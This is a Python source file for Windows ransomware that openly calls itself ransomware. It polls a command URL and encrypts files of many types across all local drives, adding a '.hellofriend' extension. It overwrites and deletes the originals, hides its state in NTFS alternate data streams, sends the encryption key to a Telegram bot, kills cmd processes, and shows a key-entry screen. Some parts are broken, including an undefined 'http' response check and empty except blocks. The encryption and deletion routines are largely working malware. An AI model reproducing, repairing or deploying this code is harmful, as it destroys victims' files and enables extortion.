from cryptography.fernet import Fernet
# import tkinter.askdirectory
import os
import time
import threading
from tkinter import *
import tkinter.messagebox
import subprocess
import base64
# import requests

commander_ip = "http://127.0.0.1/test.txt" #server ip (can use proxy or tor)
encrypted_count = 0
username = subprocess.getoutput("echo %username%")
appdata = subprocess.getoutput("echo %appdata%")
win_drive = appdata[0]
main_dirs = []
temp = subprocess.getoutput("echo %temp%")
winver = subprocess.getoutput("ver").replace(" ","")

def get_ld():
    global local_disks
    local_disks = []
    for i in "abcdefghijklmnopqrstuvwxyz":
        if subprocess.getoutput(f"{i}:") != "The system cannot find the drive specified.":
            local_disks.append(i)
def create_key():
    global ke
    try:
        subprocess.getoutput('fsutil file createNew "%temp%\\k.temp" 1024')
        ke = Fernet.generate_key()
        print(ke)
    except Exception as ex:
        print(ex)


def prime_delete(file):
    te_file = open(file,"wb")
    te_file.write(b"what do you looking for? you bitch!")
    te_file.close()
    subprocess.getoutput(f'del /F /S /Q "{file}"')

def send_key():
    bottoken = "" # insert telegram bot token here
    chatid = "" # @userinfobot
    telurl = f"https://api.telegram.org/{bottoken}/sendmessage?chat_id={chatid}&text={winver}_{username.replace(" ","")}::{str(ke)}"
    while True:
        try:
            payload = {
                "UrlBox" : telurl,
                "AgentBox" : "Google Chrome",
                "VersionsList" : "HTTP/1.1",
                "MethodList" : "GET"
            }
            # http = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", data=payload)
            if http.response == 200: #im not sure it will work or not!
                break
            else:
                pass #another httpdebugger-like site
        except:
            pass

def spl(st):
    #.split does not work here so i made this function
    if st != "File Not Found" and st != None:
        out = []
        motegayer = "" # :)
        for _ in st:
            if _ == "\n":
                out.append(motegayer)
                motegayer = ""
            else:
                motegayer = motegayer + _
        out.append(motegayer) 
        return out
    else:
        return None

def encr(file_directory_list:list, file_format_list:list):
    global encrypted_count , enced

    enced = open(f"{appdata}\\Microsoft\\Windows\\Themes\\slideshow.ini:ed","a+")
    for file_directory in file_directory_list:
        for file_format in file_format_list:
            files = spl(subprocess.getoutput(f"dir /s /b {file_directory}\\*.{file_format}"))
            if files != None:
                for file in files:
                    try:
                        tempread = open(file,"rb")
                        tempreads = tempread.read()
                        tempread.close()
                        enc_data = Fernet(ke).encrypt(tempreads)
                        tempwrite = open(f'{file}.hellofriend',"wb")
                        enced.write(f'{file}.hellofriend\n')
                        tempwrites = tempwrite.write(enc_data)
                        tempwrite.close()
                        prime_delete(file)
                        encrypted_count = encrypted_count + 1
                    except Exception as ex:
                        print(ex)

def create_files():
    subprocess.getoutput(f'fsutil file createnew "{appdata}\\Microsoft\\Windows\\Themes\\slideshow.ini:st" 0')
    subprocess.getoutput(f'fsutil file createnew "{appdata}\\Microsoft\\Windows\\Themes\\slideshow.ini:k" 0')
    subprocess.getoutput(f'fsutil file createnew "{appdata}\\Microsoft\\Windows\\Themes\\slideshow.ini:ed" 0')
    open(f"{appdata}\\Microsoft\\Windows\\Themes\\slideshow.ini:k","w").write("empty")

def decr(key:bytes):
    try:
        print("rone")
        enced_files = spl(open(f"{appdata}\\Microsoft\\Windows\\Themes\\slideshow.ini:ed","r").read())
        print(enced_files)
        dec = Fernet(key)
        print(dec)
        for filedir in enced_files:
            if filedir != "":
                filedata = open(filedir,"rb")
                exp = open(filedir.replace(".hellofriend",""),"wb")
                exp.write(dec.decrypt(filedata.read()))
                filedata.close()
                exp.close()
                prime_delete(filedir)
    except Exception as ex:
        print(ex)
        tkinter.messagebox.showerror("","Incorrect Key!\nDon't do this again Cuz it might break your files!")

def sec_killer():
    subprocess.getoutput("taskkill /f /im cmd*")
def show_screen():
    tkinter.messagebox.showerror("a friend","Hello Friend!")
    root = Tk()
    root.geometry("500x500")
    root.title("Hello Friend")
    root.mainloop()

def show_screen(): # im not sure about this function
    def enter_key():
        def check_and_start():
            tkinter.messagebox.showwarning("","it takes some time. plz wait... (click on that`ok` button) to start")
            print(entered_key.get().encode())
            decr(entered_key.get().encode())
        top = Toplevel(root)
        top.geometry("300x150")
        Label(top,text="Remember:").pack()
        Label(top,text="Dont try to crack or any unwish act\ncuz this ransomware is CRAZY").pack()
        Label(top,text="Enter the key").pack()
        entered_key = Entry(top)
        entered_key.pack()
        Button(top,text="Submit",command=check_and_start).pack()
    tkinter.messagebox.showerror("a friend","Hello Friend!") 
    root = Tk()
    root.geometry("500x500")
    root.title("Hello Friend")
    Button(root,text="test",command=enter_key).pack()
    root.mainloop()

def __main__():
    create_files()
    if subprocess.getoutput(f"curl --silent {commander_ip}") == "True" or open(f'{appdata}\\Microsoft\\Windows\\Themes\\slideshow.ini:st',"r").read() == "True":
        if open(f'{appdata}\\Microsoft\\Windows\\Themes\\slideshow.ini:ed',"r").read() == "":
            open(f'{appdata}\\Microsoft\\Windows\\Themes\\slideshow.ini:st',"w").write("True")
            try:
                create_key()
                get_ld()
                encr(local_disks,["txt","exe","db","rar","zip","png","jpg","bmp","psd","dll","iso","mp4","mkv","ogg","m4a","mp3"])
                #                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^  this ransomware will encript files with those formats
            except Exception as ex:
                # print(ex)
        try:
            show_screen()
        except Exception as ex:
            # print(ex)
__main__()